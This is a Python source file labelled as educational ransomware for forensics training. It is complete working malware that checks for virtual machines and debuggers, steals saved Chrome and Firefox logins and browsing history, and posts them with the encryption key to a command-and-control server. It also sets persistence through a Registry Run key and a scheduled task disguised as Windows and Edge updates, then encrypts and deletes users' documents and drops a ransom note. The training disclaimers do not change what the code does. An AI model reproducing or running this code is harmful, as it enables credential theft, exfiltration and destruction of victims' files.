"""
Advanced Educational Ransomware - Complete Source Code
=======================================================

FOR FORENSICS TRAINING ONLY - EDUCATIONAL PURPOSES

Author: Jesse Antman
Date: February 2026
Case: RANSOMWARE_21a34484

CAPABILITIES:
- Multi-file type encryption (PDF, DOCX, XLSX, TXT, JPG)
- AES-256 (Fernet) encryption
- Chrome/Firefox password theft
- Browser history extraction
- C2 communication (HTTP)
- Dual persistence (Registry + Scheduled Task)
- Anti-analysis (VM detection, debugger detection)
- System reconnaissance
- Data exfiltration

MITRE ATT&CK: 25 techniques across 10 tactics

WARNING: This code is for EDUCATIONAL and FORENSIC TRAINING purposes only.
         Do NOT use in production environments or against systems you don't own.
"""

import os
import sys
import platform
import socket
import hashlib
import json
import time
import subprocess
import sqlite3
import base64
import shutil
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
import winreg

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "cryptography"])
    import requests

# ════════════════════════════════════════════════════════════
# CONFIGURATION
# ════════════════════════════════════════════════════════════

C2_SERVER = "http://192.168.74.147:8080"
VICTIM_ID = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
ENCRYPTION_KEY = Fernet.generate_key()

# File extensions to encrypt
TARGET_EXTENSIONS = [
    '.pdf', '.docx', '.doc', '.xlsx', '.xls', 
    '.txt', '.jpg', '.jpeg', '.png', '.gif'
]

# Persistence
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_NAME = "WindowsSecurityUpdate"
TASK_NAME = "MicrosoftEdgeUpdate"

# ════════════════════════════════════════════════════════════
# ANTI-ANALYSIS
# ════════════════════════════════════════════════════════════

def check_vm():
    """
    Detect if running in VM
    
    MITRE ATT&CK: T1497.001 - Virtualization/Sandbox Evasion
    """
    vm_indicators = [
        'VMware', 'VirtualBox', 'VBOX', 'Hyper-V', 'QEMU'
    ]
    
    try:
        result = subprocess.check_output('wmic computersystem get manufacturer', shell=True)
        manufacturer = result.decode().lower()
        
        for indicator in vm_indicators:
            if indicator.lower() in manufacturer:
                return True
                
    except:
        pass
    
    return False

def check_debugger():
    """
    Detect if debugger is attached
    
    MITRE ATT&CK: T1622 - Debugger Evasion
    """
    try:
        import ctypes
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        return False

# ════════════════════════════════════════════════════════════
# SYSTEM RECONNAISSANCE
# ════════════════════════════════════════════════════════════

def get_system_info():
    """
    Gather comprehensive system information
    
    MITRE ATT&CK:
    - T1082: System Information Discovery
    - T1614: System Location Discovery
    - T1057: Process Discovery
    """
    info = {
        "victim_id": VICTIM_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "username": os.getenv('USERNAME'),
        "computer_name": os.getenv('COMPUTERNAME'),
        "user_domain": os.getenv('USERDOMAIN'),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "timestamp": datetime.now().isoformat(),
        "is_vm": check_vm(),
        "is_debugged": check_debugger()
    }
    
    # Get installed software count
    try:
        result = subprocess.check_output(
            'wmic product get name,version', 
            shell=True, 
            stderr=subprocess.DEVNULL
        )
        info["installed_software_count"] = len(result.decode().split('\n')) - 3
    except:
        info["installed_software_count"] = 0
    
    return info

# ════════════════════════════════════════════════════════════
# CHROME PASSWORD THEFT
# ════════════════════════════════════════════════════════════

def steal_chrome_passwords():
    """
    Extract saved passwords from Chrome
    
    MITRE ATT&CK: T1555.003 - Credentials from Web Browsers
    """
    passwords = []
    
    try:
        chrome_path = os.path.join(
            os.getenv('LOCALAPPDATA'),
            r'Google\Chrome\User Data\Default\Login Data'
        )
        
        if not os.path.exists(chrome_path):
            return passwords
        
        # Copy database to temp
        temp_db = os.path.join(os.getenv('TEMP'), 'chrome_temp.db')
        shutil.copy2(chrome_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query passwords
        cursor.execute(
            'SELECT origin_url, username_value, password_value FROM logins'
        )
        
        for row in cursor.fetchall():
            passwords.append({
                "url": row[0],
                "username": row[1],
                "password_encrypted": base64.b64encode(row[2]).decode() if row[2] else None
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        print(f"[-] Chrome password theft failed: {e}")
    
    return passwords

# ════════════════════════════════════════════════════════════
# FIREFOX PASSWORD THEFT
# ════════════════════════════════════════════════════════════

def steal_firefox_passwords():
    """
    Extract saved passwords from Firefox
    
    MITRE ATT&CK: T1555.003 - Credentials from Web Browsers
    """
    passwords = []
    
    try:
        firefox_path = os.path.join(
            os.getenv('APPDATA'),
            r'Mozilla\Firefox\Profiles'
        )
        
        if not os.path.exists(firefox_path):
            return passwords
        
        # Find profile directory
        for profile in os.listdir(firefox_path):
            logins_path = os.path.join(firefox_path, profile, 'logins.json')
            
            if os.path.exists(logins_path):
                with open(logins_path, 'r') as f:
                    data = json.load(f)
                    
                for login in data.get('logins', []):
                    passwords.append({
                        "url": login.get('hostname'),
                        "username": login.get('encryptedUsername'),
                        "password_encrypted": login.get('encryptedPassword')
                    })
        
    except Exception as e:
        print(f"[-] Firefox password theft failed: {e}")
    
    return passwords

# ════════════════════════════════════════════════════════════
# BROWSER HISTORY THEFT
# ════════════════════════════════════════════════════════════

def steal_chrome_history():
    """
    Extract browsing history from Chrome
    
    MITRE ATT&CK: T1056.001 - Input Capture: Keylogging (modified)
    """
    history = []
    
    try:
        history_path = os.path.join(
            os.getenv('LOCALAPPDATA'),
            r'Google\Chrome\User Data\Default\History'
        )
        
        if not os.path.exists(history_path):
            return history
        
        temp_db = os.path.join(os.getenv('TEMP'), 'history_temp.db')
        shutil.copy2(history_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get last 100 URLs
        cursor.execute(
            'SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100'
        )
        
        for row in cursor.fetchall():
            history.append({
                "url": row[0],
                "title": row[1],
                "visit_count": row[2]
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        print(f"[-] Chrome history theft failed: {e}")
    
    return history

# ════════════════════════════════════════════════════════════
# C2 COMMUNICATION
# ════════════════════════════════════════════════════════════

def register_with_c2():
    """
    Initial registration with C2 server
    
    MITRE ATT&CK:
    - T1071.001: Application Layer Protocol (Web Protocols)
    - T1041: Exfiltration Over C2 Channel
    """
    try:
        info = get_system_info()
        
        # Add stolen data
        info["chrome_passwords"] = steal_chrome_passwords()
        info["firefox_passwords"] = steal_firefox_passwords()
        info["chrome_history"] = steal_chrome_history()
        
        # CRITICAL: Send encryption key to C2
        info["encryption_key"] = ENCRYPTION_KEY.decode()
        
        response = requests.post(
            f"{C2_SERVER}/register",
            json=info,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"[+] Registered with C2")
            return True
        
    except Exception as e:
        print(f"[-] C2 registration failed: {e}")
    
    return False

def exfiltrate_data(encrypted_files):
    """
    Send encrypted file list to C2
    
    MITRE ATT&CK:
    - T1041: Exfiltration Over C2 Channel
    - T1020: Automated Exfiltration
    """
    try:
        data = {
            "victim_id": VICTIM_ID,
            "encrypted_files": encrypted_files,
            "count": len(encrypted_files),
            "timestamp": datetime.now().isoformat()
        }
        
        response = requests.post(
            f"{C2_SERVER}/exfiltrate",
            json=data,
            timeout=10
        )
        
        return response.status_code == 200
        
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")
        return False

# ════════════════════════════════════════════════════════════
# PERSISTENCE
# ════════════════════════════════════════════════════════════

def create_registry_persistence():
    """
    Create Registry Run key persistence
    
    MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
    """
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, REGISTRY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        
        print(f"[+] Registry persistence created")
        return True
        
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")
        return False

def create_scheduled_task():
    """
    Create Scheduled Task persistence
    
    MITRE ATT&CK: T1053.005 - Scheduled Task/Job: Scheduled Task
    """
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>{os.getenv('USERDOMAIN')}\\{os.getenv('USERNAME')}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions>
    <Exec>
      <Command>{exe_path}</Command>
    </Exec>
  </Actions>
</Task>"""
        
        temp_xml = os.path.join(os.getenv('TEMP'), f"{TASK_NAME}.xml")
        with open(temp_xml, 'w', encoding='utf-16') as f:
            f.write(xml)
        
        cmd = f'schtasks /Create /TN "{TASK_NAME}" /XML "{temp_xml}" /F'
        result = subprocess.run(cmd, shell=True, capture_output=True)
        
        try:
            os.remove(temp_xml)
        except:
            pass
        
        if result.returncode == 0:
            print(f"[+] Scheduled Task created")
            return True
            
    except Exception as e:
        print(f"[-] Scheduled Task failed: {e}")
    
    return False

# ════════════════════════════════════════════════════════════
# FILE ENCRYPTION
# ════════════════════════════════════════════════════════════

def find_target_files():
    """
    Find all files matching target extensions
    
    MITRE ATT&CK:
    - T1083: File and Directory Discovery
    - T1119: Automated Collection
    """
    files = []
    
    search_paths = [
        Path.home() / "Documents",
        Path.home() / "Desktop",
        Path.home() / "Downloads",
        Path.home() / "Pictures"
    ]
    
    print("[*] Scanning for target files...")
    
    for search_path in search_paths:
        if search_path.exists():
            for ext in TARGET_EXTENSIONS:
                for file in search_path.rglob(f"*{ext}"):
                    files.append(str(file))
                    print(f"    Found: {file.name}")
    
    print(f"[+] Total files found: {len(files)}")
    return files

def encrypt_file(file_path, key):
    """
    Encrypt a single file
    
    MITRE ATT&CK:
    - T1486: Data Encrypted for Impact
    - T1070.004: Indicator Removal on Host: File Deletion
    """
    try:
        fernet = Fernet(key)
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted_data = fernet.encrypt(data)
        encrypted_path = file_path + ".locked"
        
        time.sleep(0.05)  # Forensic timestamp spacing
        
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Secure delete original
        os.remove(file_path)
        
        print(f"[+] Encrypted: {Path(file_path).name}")
        return encrypted_path
        
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}")
        return None

# ════════════════════════════════════════════════════════════
# RANSOM NOTE
# ════════════════════════════════════════════════════════════

RANSOM_NOTE_TEMPLATE = """
╔══════════════════════════════════════════════════════════════════╗
║                YOUR FILES HAVE BEEN ENCRYPTED                    ║
╚══════════════════════════════════════════════════════════════════╝

  ATTENTION  

All your important files (documents, photos, databases) have been 
encrypted with military-grade AES-256 encryption.

   ENCRYPTION DETAILS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Victim ID:        {victim_id}
Encryption Time:  {timestamp}
Files Encrypted:  {file_count}
Algorithm:        AES-256 (Fernet)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  DECRYPTION:
Your encryption key is stored securely on our server.
To decrypt your files, the decryption key must be retrieved.

  IMPORTANT NOTES:
- Do NOT delete or rename .locked files
- Do NOT attempt to decrypt files yourself
- Do NOT use file recovery tools
- Any tampering will result in permanent data loss

╔══════════════════════════════════════════════════════════════════╗
║              THIS IS AN EDUCATIONAL SIMULATION                   ║
║                                                                  ║
║  This ransomware was created for FORENSICS TRAINING purposes.   ║
║  The encryption key is stored for recovery.                     ║
║  Contact your instructor for the decryption tool.               ║
╚══════════════════════════════════════════════════════════════════╝

C2 Server: 192.168.74.147:8080
Project: Blue Team Forensics Training
"""

def drop_ransom_note(file_count):
    """
    Create ransom note on desktop
    
    MITRE ATT&CK: T1491 - Defacement
    """
    try:
        desktop = Path.home() / "Desktop"
        note_path = desktop / "README_DECRYPT.txt"
        
        content = RANSOM_NOTE_TEMPLATE.format(
            victim_id=VICTIM_ID,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            file_count=file_count
        )
        
        with open(note_path, 'w') as f:
            f.write(content)
        
        print(f"[+] Ransom note created")
        return str(note_path)
        
    except Exception as e:
        print(f"[-] Failed to create ransom note: {e}")
        return None

# ════════════════════════════════════════════════════════════
# POPUP MESSAGE
# ════════════════════════════════════════════════════════════

def display_ransom_message(file_count):
    """
    Display ransom popup
    
    MITRE ATT&CK: T1491 - Defacement
    """
    try:
        import ctypes
        message = (
            f"⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️\n\n"
            f"Files Encrypted: {file_count}\n"
            f"Victim ID: {VICTIM_ID}\n\n"
            f"Check your Desktop for instructions.\n"
            f"README_DECRYPT.txt\n\n"
            f"(Educational Simulation - Forensics Training)"
        )
        
        ctypes.windll.user32.MessageBoxW(
            0,
            message,
            "⚠️ SECURITY ALERT",
            0x30  # MB_ICONWARNING
        )
    except Exception as e:
        print(f"[-] Failed to display popup: {e}")

# ════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ════════════════════════════════════════════════════════════

def main():
    """
    Main ransomware execution flow
    
    COMPLETE ATTACK CHAIN:
    1. Anti-analysis checks
    2. C2 registration + data theft
    3. Persistence creation
    4. File discovery
    5. File encryption
    6. Data exfiltration
    7. Ransom note delivery
    """
    
    print("=" * 70)
    print("Advanced Ransomware - Educational Version")
    print("FOR FORENSICS TRAINING ONLY")
    print("=" * 70)
    print(f"\n[*] Victim ID: {VICTIM_ID}")
    print(f"[*] Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {socket.gethostname()}\n")
    
    # Step 1: Anti-Analysis checks
    print("[*] Step 1/7: Performing security checks...")
    if check_debugger():
        print("[!] Debugger detected - terminating")
        return
    
    is_vm = check_vm()
    print(f"[+] VM Detection: {'Yes' if is_vm else 'No'}")
    time.sleep(1)
    
    # Step 2: C2 Registration + Data Theft
    print("\n[*] Step 2/7: Registering with C2 and stealing credentials...")
    register_with_c2()
    time.sleep(1)
    
    # Step 3: Create Persistence
    print("\n[*] Step 3/7: Creating persistence mechanisms...")
    create_registry_persistence()
    create_scheduled_task()
    time.sleep(1)
    
    # Step 4: Find target files
    print("\n[*] Step 4/7: Scanning for target files...")
    target_files = find_target_files()
    
    if not target_files:
        print("[!] No target files found")
        return
    
    time.sleep(1)
    
    # Step 5: Encrypt files
    print(f"\n[*] Step 5/7: Encrypting {len(target_files)} files...")
    encrypted_files = []
    
    for file in target_files:
        encrypted = encrypt_file(file, ENCRYPTION_KEY)
        if encrypted:
            encrypted_files.append(encrypted)
        time.sleep(0.1)
    
    print(f"\n[+] Successfully encrypted {len(encrypted_files)} files")
    time.sleep(1)
    
    # Step 6: Exfiltrate data
    print("\n[*] Step 6/7: Exfiltrating encrypted file list...")
    exfiltrate_data(encrypted_files)
    time.sleep(1)
    
    # Step 7: Drop ransom note and display message
    print("\n[*] Step 7/7: Creating ransom note...")
    drop_ransom_note(len(encrypted_files))
    display_ransom_message(len(encrypted_files))
    
    print("\n" + "=" * 70)
    print("   Ransomware execution complete")
    print(f"   Statistics:")
    print(f"   - Files encrypted: {len(encrypted_files)}")
    print(f"   - Victim ID: {VICTIM_ID}")
    print(f"   - Encryption key: Stored on C2 server ONLY")
    print(f"   - Chrome passwords: Stolen")
    print(f"   - Browser history: Stolen")
    print("=" * 70)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
